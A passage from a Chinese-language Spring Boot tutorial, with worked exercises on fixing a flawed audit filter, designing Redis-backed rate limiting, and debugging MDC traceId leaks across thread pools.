| Filter 的 `finally` | TCP 寫入（回應大於 buffer 時會含一部分） |
| Nginx 的 `$request_time` | 什麼都含，**包含客戶端的接收速度** |

**三個數字都有用，但它們不一樣。**
慢請求告警通常看 Filter 的數字（排除客戶端網路慢的干擾）；
SLO 通常看 Nginx 的數字（那是使用者真正的體驗）。

**第 6 題**的重點是知道 `ShallowEtagHeaderFilter` 存在，
**但也知道它的限制**：它省的是頻寬，不是資料庫查詢。
真正有價值的 ETag 要在 Controller 用版本號產生。

</details>

### 練習 2：找出這個 Filter 的 9 個問題

```java
@Component
public class AuditFilter implements Filter {

    @Autowired
    private AuditService auditService;

    @Override
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
            throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) req;
        HttpServletResponse response = (HttpServletResponse) res;

        String traceId = request.getHeader("X-Request-Id");
        MDC.put("traceId", traceId);

        String body = new String(request.getInputStream().readAllBytes());

        long start = System.currentTimeMillis();
        chain.doFilter(req, res);
        long duration = System.currentTimeMillis() - start;

        auditService.record(new AuditRecord(
                request.getRequestURI(),
                request.getMethod(),
                body,
                response.getStatus(),
                duration,
                request.getHeader("Authorization")));

        MDC.remove("traceId");
    }
}
```

<details>
<summary>解答</summary>

| # | 問題 | 後果 |
|---|---|---|
| 1 | **實作 `Filter` 而非 `OncePerRequestFilter`** | ASYNC / ERROR dispatch 時重複執行 → 稽核紀錄重複、traceId 被覆寫（4.4.1）。⚠️ forward/include 預設不會發生 |
| 2 | **`traceId` 沒有驗證** | **log injection**（4.5.3）。攻擊者能在稽核紀錄裡偽造內容 |
| 3 | **`traceId` 可能是 `null`** | `MDC.put(key, null)` 在 logback 上是「移除」，於是 log 沒有 traceId；也沒有 fallback 產生 |
| 4 | **`readAllBytes()` 讀掉 body** | Controller 的 `@RequestBody` 拿到空的 → **所有 POST 都 400** |
| 5 | **沒有 `try-finally`** | 例外時 `MDC.remove` 不執行 → traceId **洩漏到執行緒池的下一個請求**（4.5.4） |
| 6 | **`Authorization` header 被存進稽核紀錄** | **token 進了資料庫**。稽核紀錄通常保留 7 年，等於長期洩漏憑證 |
| 7 | **body 沒有遮蔽、沒有長度限制** | 密碼、卡號進資料庫；1 MB 的 body × 每天 100 萬筆 = 磁碟爆掉 |
| 8 | **`auditService.record()` 是同步的** | 寫資料庫 5 ms × 每個請求，而且它在 `chain.doFilter` 之後、回應寫回之前 → **延遲直接加到使用者身上** |
| 9 | **`auditService.record()` 拋例外會讓整個請求失敗** | 稽核系統掛掉 → **整個 API 掛掉** |

**額外三個（送你）**：

| # | 問題 |
|---|---|
| 10 | 沒有 `@Order` → 排在 Security 之後 → 認證失敗的請求不會被稽核（而那正是最需要稽核的） |
| 11 | `response.getStatus()` 在回應未 commit 時可能不是最終值 —— 要用 `ContentCachingResponseWrapper` 或在 `afterCompletion` 讀 |
| 12 | 對 `/actuator/health` 也會稽核 → 每天 17,280 筆無意義紀錄（4.4.5） |

**修正版**：

```java
package example.shop.common.web;

import example.shop.common.audit.AuditEvent;
import jakarta.servlet.FilterChain;
import jakarta.servlet.ServletException;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.slf4j.MDC;
import org.springframework.context.ApplicationEventPublisher;
import org.springframework.core.annotation.Order;
import org.springframework.stereotype.Component;
import org.springframework.web.filter.OncePerRequestFilter;
import org.springframework.web.servlet.HandlerMapping;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.time.Instant;

/**
 * 稽核日誌。
 *
 * <p>設計決策：
 * <ul>
 *   <li>繼承 {@link OncePerRequestFilter}：避免重複稽核。</li>
 *   <li>order = -115：在 CachedBodyFilter(-117) 之後（才拿得到 body）、
 *       Security(-100) 之前（才能稽核認證失敗）。</li>
 *   <li><b>發事件而不是直接寫入</b>：讓寫入非同步、可失敗、可換實作。</li>
 *   <li>traceId 交給 TraceIdFilter（-121）處理，這裡只讀。</li>
 * </ul>
 */
@Component
@Order(-115)
public class AuditFilter extends OncePerRequestFilter {

    private static final Logger log = LoggerFactory.getLogger(AuditFilter.class);

    private static final int MAX_BODY_LENGTH = 4096;

    private final ApplicationEventPublisher eventPublisher;
    private final BodyMasker bodyMasker;
    private final RequestLoggingProperties properties;

    public AuditFilter(ApplicationEventPublisher eventPublisher,
                       BodyMasker bodyMasker,
                       RequestLoggingProperties properties) {
        this.eventPublisher = eventPublisher;
        this.bodyMasker = bodyMasker;
        this.properties = properties;
    }

    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response,
                                    FilterChain chain) throws ServletException, IOException {
        long startNanos = System.nanoTime();
        Instant startedAt = Instant.now();
        try {
            chain.doFilter(request, response);
        } finally {
            try {
                publishAuditEvent(request, response, startedAt,
                        (System.nanoTime() - startNanos) / 1_000_000);
            } catch (Exception e) {
                // ★ 問題 9 的修正：稽核失敗絕不影響請求
                log.warn("稽核事件發布失敗: {}", e.getMessage());
            }
        }
    }

    private void publishAuditEvent(HttpServletRequest request, HttpServletResponse response,
                                   Instant startedAt, long durationMs) {
        String body = null;
        if (request instanceof CachedBodyRequestWrapper cached) {
            String raw = new String(cached.cachedBody(), StandardCharsets.UTF_8);
            // ★ 問題 7 的修正：遮蔽 + 截斷
            String masked = bodyMasker.mask(raw);
            body = (masked.length() <= MAX_BODY_LENGTH)
                    ? masked : masked.substring(0, MAX_BODY_LENGTH) + "…";
        }

        Object pattern = request.getAttribute(HandlerMapping.BEST_MATCHING_PATTERN_ATTRIBUTE);

        eventPublisher.publishEvent(new AuditEvent(
                TraceContext.current(),              // ★ 問題 2、3：已驗證的 traceId
                request.getMethod(),
                (pattern != null) ? pattern.toString() : request.getRequestURI(),
                request.getRequestURI(),
                body,
                response.getStatus(),                 // ⚠️ 問題 11：見下方註記
                durationMs,
                startedAt,
                MDC.get(TraceContext.MDC_ACTOR_ID),
                MDC.get(TraceContext.MDC_CLIENT_IP)
                // ★ 問題 6 的修正：完全不記 Authorization
        ));
    }

    @Override
    protected boolean shouldNotFilter(HttpServletRequest request) {
        // ★ 問題 12 的修正
        if (properties.isExcluded(request.getRequestURI())) return true;
        // 只稽核「有副作用」的操作 + 敏感的讀取
        return "GET".equals(request.getMethod())
                && !request.getRequestURI().startsWith("/customers");
    }
}
```

```java
package example.shop.common.audit;

import org.springframework.context.event.EventListener;
import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Component;

/** ★ 問題 8 的修正：稽核寫入是非同步的，不佔用請求執行緒。 */
@Component
public class AuditEventListener {

    private static final org.slf4j.Logger log =
            org.slf4j.LoggerFactory.getLogger(AuditEventListener.class);

    private final AuditRepository repository;

    public AuditEventListener(AuditRepository repository) {
        this.repository = repository;
    }

    @Async                          // 用 4.5.7 的 executor（有 MdcTaskDecorator）
    @EventListener
    public void onAuditEvent(AuditEvent event) {
        try {
            repository.save(event);
        } catch (Exception e) {
            // ⚠️ 稽核寫入失敗要記 error 並告警 —— 稽核遺失是合規問題
            log.error("稽核紀錄寫入失敗 traceId={}", event.traceId(), e);
        }
    }
}
```

⚠️ **問題 11 沒有完全解決。** `response.getStatus()` 在 filter 的 `finally` 裡
通常是正確的（因為 `DispatcherServlet` 已經設定了），
但如果回應是**串流**且已經 commit，可能拿不到最終狀態。

**完整解法**是用 `ContentCachingResponseWrapper` 或在 Interceptor 的 `afterCompletion` 讀，
**但那有 4.4.6 的成本**。

**實務上的判斷**：稽核紀錄的狀態碼「大致正確」是可接受的
（真正的權威是 Nginx 的 access log）。
**把這個限制寫在註解裡，不要假裝解決了。**

⚠️ **另一個沒解決的問題**：`@Async` 的稽核寫入在「程序被 SIGKILL」時會遺失。
如果稽核有合規要求（金融、醫療），**必須改成同步寫入或用 outbox 模式**
（05-service 第 05 章）。**這是架構決策，不是技術細節。**

</details>

### 練習 3：設計「依使用者限流」

需求（依 03-rest-api 第 08 章 8.4）：

```
POST /orders                每個使用者每分鐘 10 次
POST /orders/{id}/payments  每個使用者每分鐘 5 次
GET  /*                     每個使用者每分鐘 300 次
未認證的請求                 每個 IP 每分鐘 60 次
```

回應要帶 `X-RateLimit-Limit`、`X-RateLimit-Remaining`、`X-RateLimit-Reset`、`Retry-After`。

請設計：
1. 用哪些機制（可以多個）？各自負責什麼？
2. 註解的設計。
3. 「未認證依 IP」與「已認證依使用者」怎麼分工。
4. 兩個必須處理的競態。

<details>
<summary>解答</summary>

**1. 機制選擇：兩層**

| 層 | 機制 | order / 位置 | 負責 |
|---|---|---|---|
| **第一層** | Filter | order **-119**（Security 之前） | 依 **IP** 限流（60/min）。擋掉未認證的暴力請求，**不消耗認證的 CPU** |
| **第二層** | Interceptor | 註冊在 `PageableGuard` 之前 | 依 **使用者 + 端點** 限流。需要 `HandlerMethod` 讀註解、需要 Security 之後知道使用者 |

**為什麼一定要兩層？**

只有 Interceptor（Security 之後）時：

```
攻擊者用無效的 token 打 10,000 次/秒
→ 每次都要驗 JWT（簽章驗證約 0.1 ms CPU）
→ 每次都被 401 擋掉，但 CPU 已經花了
→ 而且 Interceptor 根本不會被呼叫（401 在 filter 層就結束）
→ ⚠️ 限流完全沒生效
```

只有 Filter（依 IP）時：

```
1,000 個使用者共用一個 NAT 出口 IP（公司網路）
→ 全部人加起來 60/min
→ 正常使用者被誤擋
```

**兩層各解決一半的問題。**

**2. 註解設計**

```java
package example.shop.common.web.ratelimit;

import java.lang.annotation.*;

/**
 * 端點層級的限流。
 *
 * <p>未標註的端點套用預設值（{@code api.rate-limit.default-*}）——
 * 這是刻意的「安全的預設值」：忘記加註解不會變成漏洞。
 */
@Documented
@Target(ElementType.METHOD)
@Retention(RetentionPolicy.RUNTIME)
public @interface RateLimit {

    /** 每個時間窗允許的請求數。 */
    int limit();

    /** 時間窗（秒）。 */
    int windowSeconds() default 60;

    /** 限流的分組鍵。相同 bucket 的端點**共用**配額。 */
    String bucket() default "";

    /** 依什麼分桶。 */
    Scope scope() default Scope.ACTOR;

    enum Scope {
        /** 每個使用者一個桶。 */
        ACTOR,
        /** 每個 IP 一個桶（適合未認證端點）。 */
        IP,
        /** 全域共用一個桶（適合保護昂貴的下游）。 */
        GLOBAL
    }
}
```

```java
@RestController
@RequestMapping("/orders")
public class OrderController {

    @PostMapping
    @Idempotent
    @RateLimit(limit = 10, windowSeconds = 60, bucket = "order-write")
    public ResponseEntity<CreateOrderResponse> create(...) { }

    @GetMapping
    @RateLimit(limit = 300, windowSeconds = 60, bucket = "read")
    public PageResponse<OrderSummary> list(...) { }
}
```

```java
@RestController
@RequestMapping("/orders/{orderId}/payments")
public class OrderPaymentController {

    @PostMapping
    @Idempotent
    // ★ 獨立的 bucket：付款比下單更貴（要打金流商），配額更嚴
    @RateLimit(limit = 5, windowSeconds = 60, bucket = "payment")
    public ResponseEntity<PaymentResponse> create(...) { }
}
```

**`bucket` 的設計理由** ★：
如果每個端點自己一個桶，攻擊者可以「每個端點都打到上限」——
總量還是很大。用 `bucket = "order-write"` 讓所有寫入端點共用配額，
總量就被控制住了。

**3. 兩層的實作**

```java
package example.shop.common.web.ratelimit;

import example.shop.common.error.ErrorCode;
import example.shop.common.web.ClientIpResolver;
import example.shop.common.web.ProblemWriter;
import jakarta.servlet.FilterChain;
import jakarta.servlet.ServletException;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.core.annotation.Order;
import org.springframework.stereotype.Component;
import org.springframework.web.filter.OncePerRequestFilter;

import java.io.IOException;
import java.util.Map;

/**
 * 第一層：依 IP 的粗粒度限流。
 *
 * <p>order = -119：在 Security（-100）之前，
 * 所以「用無效 token 暴打」的請求在驗 JWT 之前就被擋掉。
 */
@Component
@Order(-119)
public class IpRateLimitFilter extends OncePerRequestFilter {

    private final RateLimiter rateLimiter;
    private final ProblemWriter problemWriter;
    private final RateLimitProperties properties;
    private final ClientIpResolver clientIpResolver;

    public IpRateLimitFilter(RateLimiter rateLimiter, ProblemWriter problemWriter,
                             RateLimitProperties properties,
                             ClientIpResolver clientIpResolver) {
        this.rateLimiter = rateLimiter;
        this.problemWriter = problemWriter;
        this.properties = properties;
        this.clientIpResolver = clientIpResolver;
    }

    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response,
                                    FilterChain chain) throws ServletException, IOException {

        String ip = clientIpResolver.resolve(request);
        var decision = rateLimiter.tryConsume(
                "ip:" + ip, properties.ipLimit(), properties.ipWindowSeconds());

        // ★ 不管有沒有超限都要回 header（讓客戶端知道剩多少，能主動放慢）
        writeRateLimitHeaders(response, decision);

        if (!decision.allowed()) {
            problemWriter.write(request, response, ErrorCode.RATE_LIMIT_EXCEEDED,
                    "Too many requests from this IP address.",
                    Map.of("limit", decision.limit(),
                           "windowSeconds", properties.ipWindowSeconds(),
                           "remaining", 0,
                           "resetAt", decision.resetAt().toString(),
                           "retryAfterSeconds", decision.retryAfterSeconds(),
                           "scope", "IP"));
            return;
        }
        chain.doFilter(request, response);
    }

    static void writeRateLimitHeaders(HttpServletResponse response,
                                      RateLimiter.Decision decision) {
        response.setHeader("X-RateLimit-Limit", String.valueOf(decision.limit()));
        response.setHeader("X-RateLimit-Remaining", String.valueOf(decision.remaining()));
        response.setHeader("X-RateLimit-Reset",
                String.valueOf(decision.resetAt().getEpochSecond()));
        if (!decision.allowed()) {
            response.setHeader("Retry-After", String.valueOf(decision.retryAfterSeconds()));
        }
    }

    @Override
    protected boolean shouldNotFilter(HttpServletRequest request) {
        return request.getRequestURI().startsWith("/actuator");
    }
}
```

```java
package example.shop.common.web.ratelimit;

import example.shop.common.error.ErrorCode;
import example.shop.common.web.ClientIpResolver;
import example.shop.common.web.CurrentActorHolder;
import example.shop.common.web.OncePerRequestInterceptor;
import example.shop.common.web.ProblemWriter;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.stereotype.Component;
import org.springframework.web.method.HandlerMethod;

import java.io.IOException;
import java.util.Map;

/** 第二層：依使用者 + 端點的細粒度限流。 */
@Component
public class RateLimitInterceptor extends OncePerRequestInterceptor {

    private final RateLimiter rateLimiter;
    private final ProblemWriter problemWriter;
    private final RateLimitProperties properties;
    private final ClientIpResolver clientIpResolver;

    public RateLimitInterceptor(RateLimiter rateLimiter, ProblemWriter problemWriter,
                                RateLimitProperties properties,
                                ClientIpResolver clientIpResolver) {
        this.rateLimiter = rateLimiter;
        this.problemWriter = problemWriter;
        this.properties = properties;
        this.clientIpResolver = clientIpResolver;
    }

    @Override
    protected boolean preHandleOnce(HttpServletRequest request, HttpServletResponse response,
                                    Object handler) throws IOException {

        if (!(handler instanceof HandlerMethod handlerMethod)) return true;

        RateLimit annotation = handlerMethod.getMethodAnnotation(RateLimit.class);

        int limit;
        int windowSeconds;
        String bucket;
        RateLimit.Scope scope;

        if (annotation != null) {
            limit = annotation.limit();
            windowSeconds = annotation.windowSeconds();
            bucket = annotation.bucket().isEmpty()
                    ? handlerMethod.getMethod().getName() : annotation.bucket();
            scope = annotation.scope();
        } else {
            // ★★★ 沒標註的端點也要有預設限流（否則新端點就是漏洞）
            limit = properties.defaultActorLimit();
            windowSeconds = properties.defaultWindowSeconds();
            bucket = "default";
            scope = RateLimit.Scope.ACTOR;
        }

        String key = switch (scope) {
            case ACTOR  -> "actor:" + CurrentActorHolder.actorIdOrAnonymous() + ":" + bucket;
            case IP     -> "ip:" + clientIpResolver.resolve(request) + ":" + bucket;
            case GLOBAL -> "global:" + bucket;
        };

        var decision = rateLimiter.tryConsume(key, limit, windowSeconds);
        IpRateLimitFilter.writeRateLimitHeaders(response, decision);

        if (!decision.allowed()) {
            problemWriter.write(request, response, ErrorCode.RATE_LIMIT_EXCEEDED,
                    "Rate limit of %d requests per %d seconds exceeded for bucket '%s'."
                            .formatted(limit, windowSeconds, bucket),
                    Map.of("limit", limit,
                           "windowSeconds", windowSeconds,
                           "remaining", 0,
                           "resetAt", decision.resetAt().toString(),
                           "retryAfterSeconds", decision.retryAfterSeconds(),
                           "bucket", bucket,
                           "scope", scope.name()));
            return false;                          // ★ 4.7.2：已經寫完回應了
        }
        return true;
    }
}
```

⚠️ **「沒標註的端點用預設限流」是關鍵設計。**
如果沒標註就不限流，那麼**每個新端點都是一個漏洞**
（而且是「忘記加註解」這種必然會發生的漏洞）。

**這是「安全的預設值」原則**：預設是保護的，要放寬才需要明確宣告。

**4. 兩個必須處理的競態**

**競態 1：計數的原子性**

```java
// ❌ 有競態
long count = redis.get(key);            // T1: A 讀到 9
if (count >= limit) return DENIED;      // T2: B 也讀到 9
redis.set(key, count + 1);              // T3、T4: 都寫 10 → 實際通過 11 次
```

**正確做法：用 Lua script 讓「INCR + 讀 TTL + 判斷」變成原子操作。**

```java
package example.shop.common.web.ratelimit;

import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.data.redis.core.script.DefaultRedisScript;
import org.springframework.stereotype.Component;

import java.time.Instant;
import java.util.List;

/** 固定窗計數器。用 Lua 保證原子性。 */
@Component
public class RedisRateLimiter implements RateLimiter {

    private static final org.slf4j.Logger log =
            org.slf4j.LoggerFactory.getLogger(RedisRateLimiter.class);

    /**
     * KEYS[1] = 計數鍵
     * ARGV[1] = limit、ARGV[2] = windowSeconds
     * 回傳 {allowed, remaining, ttl}
     */
    private static final String LUA = """
            local current = redis.call('INCR', KEYS[1])
            if current == 1 then
                redis.call('EXPIRE', KEYS[1], ARGV[2])
            end
            local ttl = redis.call('TTL', KEYS[1])
            local limit = tonumber(ARGV[1])
            if current > limit then
                return {0, 0, ttl}
            end
            return {1, limit - current, ttl}
            """;

    private final StringRedisTemplate redis;
    private final DefaultRedisScript<List> script;
    private final io.micrometer.core.instrument.MeterRegistry meterRegistry;

    public RedisRateLimiter(StringRedisTemplate redis,
                            io.micrometer.core.instrument.MeterRegistry meterRegistry) {
        this.redis = redis;
        this.meterRegistry = meterRegistry;
        this.script = new DefaultRedisScript<>();
        this.script.setScriptText(LUA);
        this.script.setResultType(List.class);
    }

    @Override
    public Decision tryConsume(String key, int limit, int windowSeconds) {
        try {
            @SuppressWarnings("unchecked")
            List<Long> result = redis.execute(script, List.of("rl:" + key),
                    String.valueOf(limit), String.valueOf(windowSeconds));

            if (result == null || result.size() < 3) {
                return failOpen(limit, windowSeconds, "empty-result");
            }
            boolean allowed = result.get(0) == 1L;
            int remaining = result.get(1).intValue();
            long ttl = Math.max(1, result.get(2));

            return new Decision(allowed, limit, remaining,
                    Instant.now().plusSeconds(ttl), (int) ttl);

        } catch (Exception e) {
            return failOpen(limit, windowSeconds, e.getClass().getSimpleName());
        }
    }

    /**
     * ⚠️ fail-open vs fail-closed 是一個重要的架構決策。
     *
     * <p>fail-open（放行）：Redis 掛了不影響服務，但失去限流保護。
     * fail-closed（全擋）：保護仍在，但 Redis 掛了 = 整個 API 掛了。
     *
     * <p>shop-service 選 fail-open，理由：
     * 限流是「保護機制」而不是「業務功能」，
     * 讓保護機制的故障導致業務中斷是本末倒置。
     *
     * <p>★ 但一定要記 metric 並告警 —— 否則沒人知道限流已經失效了。
     */
    private Decision failOpen(int limit, int windowSeconds, String reason) {
        meterRegistry.counter("shop.ratelimit.fail_open", "reason", reason).increment();
        log.warn("限流器不可用（{}），本次放行 —— 限流保護暫時失效", reason);
        return new Decision(true, limit, limit,
                Instant.now().plusSeconds(windowSeconds), windowSeconds);
    }
}
```

**競態 2：固定窗的邊界突刺（burst at window boundary）**

```
窗 = 60 秒、limit = 10

12:00:59  打 10 次   ← 這一窗的配額用完
12:01:00  窗重置
12:01:00  再打 10 次 ← 新窗的配額

→ 在 1 秒內通過了 20 次（是設定值的 2 倍）
```

**三種解法**：

| 解法 | 說明 | 取捨 |
|---|---|---|
| **滑動窗日誌** | 記下每次請求的時間戳，算「過去 60 秒內有幾次」 | ✅ 精確<br>❌ 記憶體 O(limit)；Redis 用 `ZSET` + `ZREMRANGEBYSCORE` |
| **滑動窗計數** | 保留前一窗的計數，按比例加權 | ✅ 記憶體小、夠精確<br>⚠️ 是近似值 |
| **令牌桶** | 以固定速率補充令牌 | ✅ 允許可控的突發<br>✅ 最符合「限流」的直覺 |

**shop-service 用令牌桶**（03-rest-api 第 08 章 8.4 的結論）：

```lua
-- 令牌桶的 Lua 實作
-- KEYS[1] = 桶的鍵
-- ARGV[1] = 容量、ARGV[2] = 每秒補充速率、ARGV[3] = 現在的毫秒時間戳
local bucket = redis.call('HMGET', KEYS[1], 'tokens', 'lastRefill')
local capacity = tonumber(ARGV[1])
local refillRate = tonumber(ARGV[2])          -- tokens per second
local now = tonumber(ARGV[3])

local tokens = tonumber(bucket[1])
local lastRefill = tonumber(bucket[2])

if tokens == nil then
    tokens = capacity
    lastRefill = now
else
    -- 依經過的時間補充令牌
    local elapsed = math.max(0, now - lastRefill) / 1000.0
    tokens = math.min(capacity, tokens + elapsed * refillRate)
    lastRefill = now
end

local allowed = 0
if tokens >= 1 then
    tokens = tokens - 1
    allowed = 1
end

redis.call('HMSET', KEYS[1], 'tokens', tokens, 'lastRefill', lastRefill)
-- ★ TTL 設成「桶填滿所需時間」的兩倍，避免無限增長
redis.call('PEXPIRE', KEYS[1], math.ceil(capacity / refillRate * 2000))

return {allowed, math.floor(tokens)}
```

> ### ⚠️ 關於 `redis.call('TIME')`：一個已經過時的說法 ★
>
> 常見的說法是「Lua script 裡不能用 `redis.call('TIME')`，Redis 會拒絕執行」。
> **那在 Redis 3.2 之前是對的，現在不是。**
>
> | Redis 版本 | 複寫方式 | `TIME` / `RANDOMKEY` 等非確定性指令 |
> |---|---|---|
> | < 3.2 | 把整個 script 複寫給 replica（verbatim） | 🔴 **拒絕執行** —— script 在兩邊會算出不同結果 |
> | 3.2 ～ 4.x | 預設仍是 script 複寫，可用 `redis.replicate_commands()` 切換 | ⚠️ 呼叫 `redis.replicate_commands()` 之後就可以用 |
> | **5.0+** | **一律 effects replication**（只複寫 script 造成的寫入指令） | ✅ **可以直接用** |
>
> 也就是說：**在 Redis 5 以上，`redis.call('TIME')` 是完全合法的**。
>
> **那 shop-service 為什麼還是從應用端傳時間？** 三個理由，而且都跟複寫無關：
>
> | 理由 | 說明 |
> |---|---|
> | **① 測試可控** ★★ | 時間從 `Clock` 來 → 07 章 7.4.4 的固定 `Clock` 讓「第 11 次回 429」「桶在 60 秒後補滿」變成可斷言的確定行為。用 `TIME` 的話就得真的等。 |
> | **② 與 `Retry-After` 一致** | 回應要告訴客戶端「還要等幾秒」，那個數字必須與計算令牌用的時間同源；兩個時間源會讓 `Retry-After` 偶爾算出負數。 |
> | **③ 一個時間源比兩個好** | 應用層本來就需要時間（記 log、算指標）。多一個「Redis 的時間」只是多一個要對齊的東西。 |
>
> ⚠️ **代價**：多台應用伺服器的時鐘要同步（NTP）。
> 時鐘偏移會讓 `elapsed` 算錯 ——`math.max(0, now - lastRefill)` 就是防「算出負數」。
>
> **而這個代價是可以監控的**：
>
> ```yaml
> # 一個很便宜的告警：如果某台機器的時鐘偏移超過 1 秒就告警
> - alert: ClockSkewTooLarge
>   expr: abs(node_timex_offset_seconds) > 1
>   for: 5m
> ```
>
> ★ **這一題的一般教訓**：「某個東西不能用」的說法要標版本。
> 沒標版本的限制，通常是在某個舊版本上成立的。

</details>

### 練習 4：MDC 洩漏的除錯

**現象**：正式環境的日誌裡，偶爾（約 0.3% 的請求）出現「traceId 與實際請求不符」——
客服拿著 traceId 查到的是**另一個使用者**的操作紀錄。

**已知**：
- `TraceIdFilter`（4.5.4）已正確實作，有 `finally` 清理。
- 使用虛擬執行緒（`spring.threads.virtual.enabled=true`）。
- 有 `@Async` 的通知寄送。
- 有一個 `SseEmitter` 的訂單狀態推播端點。
- 有一個第三方 SDK 的 `HandlerInterceptor`（用來做 APM）。

請列出**五個可能的原因**，以及各自的驗證方式。

<details>
<summary>解答</summary>

**原因 1：`@Async` 的 `TaskDecorator` 沒有清理**

```java
// ❌ 有洩漏的版本
public Runnable decorate(Runnable runnable) {
    Map<String, String> snapshot = MDC.getCopyOfContextMap();
    return () -> {
        MDC.setContextMap(snapshot);      // ← 設了但沒清
        runnable.run();
    };
}
```

執行緒池的執行緒被重用 → 下一個任務沿用上一個的 MDC。
如果那個任務**自己沒有設 MDC**（例如排程任務），就會用到別人的 traceId。

**驗證方式**：

```java
@Test
void TaskDecorator執行後必須清空MDC() {
    MDC.put("traceId", "aaaa");
    Runnable decorated = new MdcTaskDecorator().decorate(() ->
            assertThat(MDC.get("traceId")).isEqualTo("aaaa"));
    MDC.clear();                          // 模擬「執行緒被歸還後」

    decorated.run();

    assertThat(MDC.get("traceId"))
            .as("任務執行完必須清空，否則污染下一個任務")
            .isNull();
}
```

**原因 2：`SseEmitter` 的回呼沒清理 MDC**

```java
// ❌
eventBus.subscribe(orderId, event -> {
    MDC.put("traceId", traceId);
    emitter.send(event);
    // ← 沒有 finally
});
```

事件推播的執行緒（通常是訊息佇列的 consumer 執行緒池）被重用 →
下一個訂單的推播沿用上一個的 traceId。

**驗證方式**：搜尋所有 `MDC.put` 的呼叫點，確認每一個都有對應的清理。

```bash
# put 的次數應該和（remove + clear + setContextMap）大致相符
grep -rn "MDC.put" src/main/java/ | wc -l
grep -rn "MDC.remove\|MDC.clear\|MDC.setContextMap" src/main/java/ | wc -l
```

⚠️ 這個檢查很粗（迴圈、多個 key 會讓數字對不上），
**但「put 明顯多於清理」就是一個訊號**。

**更嚴謹的做法：用 ArchUnit 集中控制 MDC 的寫入。**

```java
@Test
void MDC只能在指定的類別裡被寫入() {
    JavaClasses classes = new ClassFileImporter().importPackages("example.shop");

    noClasses().that().resideOutsideOfPackages(
                    "example.shop.common.web..", "example.shop.common.config..")
            .should().callMethodWhere(target ->
                    target.getTargetOwner().getName().equals("org.slf4j.MDC")
                    && target.getName().equals("put"))
            .because("MDC 的寫入必須集中，否則會有清理遺漏（04 章練習 4）")
            .check(classes);
}
```

**原因 3：第三方 SDK 的 Interceptor 覆寫了 MDC**

APM SDK（某些 New Relic / Datadog / Elastic APM 的整合）會自己設定
MDC 的 `traceId`（用它們自己的格式）。

如果它的 interceptor 在我們的 filter 之後執行，**它會覆蓋我們的值**——
於是回應 header 的 traceId 與 log 裡的不同。

**驗證方式**：4.14.4 的「回應 header 的 traceId 與 body 裡的一致」測試，
再加上 log 的比對：

```java
@Test
void 沒有其他元件覆寫traceId() {
    try (var captor = new LogCaptor(OrderController.class)) {
        var response = rest.getForEntity("/orders/ord_x", String.class);
        String headerTraceId = response.getHeaders().getFirst("X-Trace-Id");

        assertThat(captor.mdcOf(0, "traceId"))
                .as("log 裡的 traceId 被其他元件覆寫了")
                .isEqualTo(headerTraceId);
    }
}
```

**解法**：如果無法阻止 SDK 覆寫，就**改用不同的 MDC key**
（例如 `appTraceId`），並在 log pattern 裡同時輸出兩個。

**原因 4：`ASYNC` dispatch 的 MDC 重建產生新的 traceId**

`TraceIdFilter` 的 `shouldNotFilterAsyncDispatch()` 回 `false`（4.5.4），
所以 ASYNC dispatch 時**一定會**再執行一次 `doFilterInternal`。

⚠️⚠️ **「已執行過」attribute 幫不上忙** ——
`OncePerRequestFilter` 在 `finally` 裡就把它移除了，
而那個 `finally` 在請求進入非同步模式之前就跑完了（4.4.6 的完整說明）。

**所以如果 `doFilterInternal` 直接呼叫 `traceIdSource.resolve()`，
ASYNC dispatch 就會產生一個新的 traceId** ——
同一個請求的 log 有兩個 traceId，追蹤斷成兩半。

**這是 4.5.4 的 `resolveOnce()` 存在的唯一理由。**

**驗證方式**（4.12.3 的探測端點 + `LogCaptor`）：

```java
@Test
void 非同步端點的traceId在整個生命週期一致() {
    try (var captor = new LogCaptor(AsyncProbeController.class)) {
        var response = rest.getForEntity("/probe/async", String.class);
        String headerTraceId = response.getHeaders().getFirst("X-Trace-Id");

        Awaitility.await().atMost(Duration.ofSeconds(3))
                .until(() -> captor.events().size() >= 2);

        assertThat(captor.mdcOf(0, "traceId")).isEqualTo(headerTraceId);
        assertThat(captor.mdcOf(1, "traceId")).isEqualTo(headerTraceId);
    }
}
```

**原因 5：虛擬執行緒掩蓋了問題**

⚠️ **這一項是「反例」**：虛擬執行緒**不會**造成 MDC 洩漏
（每條虛擬執行緒是新的，不重用）。

**但它會掩蓋問題**：
在虛擬執行緒上，「忘記清理 MDC」不會有症狀（因為執行緒被丟棄）。
於是這個 bug 在主請求路徑上看不出來，
**直到某個路徑跑在平台執行緒上** ——
而 `@Async` 的 `ThreadPoolTaskExecutor` 就是平台執行緒池，
**不受 `spring.threads.virtual.enabled` 影響**。

**驗證方式**：

```java
@Test
void 確認Async用的是什麼執行緒() throws Exception {
    var future = asyncProbe.whatThread();     // 一個 @Async 方法回傳 CompletableFuture<String>
    String threadInfo = future.get(3, TimeUnit.SECONDS);

    System.out.println("Async 執行緒: " + threadInfo);
    // 平台執行緒（會被重用）：Thread[#42,shop-async-1,5,main]
    // 虛擬執行緒（不重用）：  VirtualThread[#65]/runnable@ForkJoinPool-1-worker-1
}
```

**這也是「0.3%」這個數字的線索** ——
只有走 `@Async` 路徑的請求（下單後寄通知）才會受影響，
而那大約就是所有請求的一小部分。

**最可能的答案：原因 1**（`@Async` 的 `TaskDecorator` 沒清理）。

**理由**：
- 0.3% 的比例符合「只有寄通知的路徑」。
- 「查到另一個使用者的紀錄」符合「執行緒池重用」的特徵。
- 虛擬執行緒讓主請求路徑沒問題，**掩蓋了 `@Async` 路徑的問題**。

**這一題的教學重點**：

> **MDC 洩漏的除錯必須從「哪些地方寫了 MDC」開始，
> 而不是從「哪些地方讀了 MDC」。**
>
> 而最有效的預防是「把 MDC 的寫入集中在少數幾個類別，並用 ArchUnit 守住」。

⚠️ **順帶一個更根本的建議**：如果專案有分散式追蹤，
